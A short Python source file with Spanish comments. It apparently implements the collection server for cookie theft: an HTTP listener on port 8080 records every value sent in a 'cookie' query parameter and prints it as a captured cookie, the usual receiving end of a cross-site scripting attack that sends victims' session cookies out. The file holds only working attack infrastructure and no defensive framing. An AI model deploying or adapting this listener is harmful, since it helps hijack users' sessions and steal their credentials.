from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import threading

cookies = []
server = None

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Parsea ?cookie=valor
        params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        if 'cookie' in params:
            c = params['cookie'][0]
            cookies.append(c)
            print(f"[+] Cookie: {c}")
        
        self.send_response(200)
        self.end_headers()
    
    def log_message(self, *args):
        pass

def start_listener(port=8080):
    global server
    server = HTTPServer(('0.0.0.0', port), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"[+] Listener en puerto {port}")

def stop_listener():
    if server:
        server.shutdown()
        print("[+] Listener detenido")

def get_cookies():
    return cookies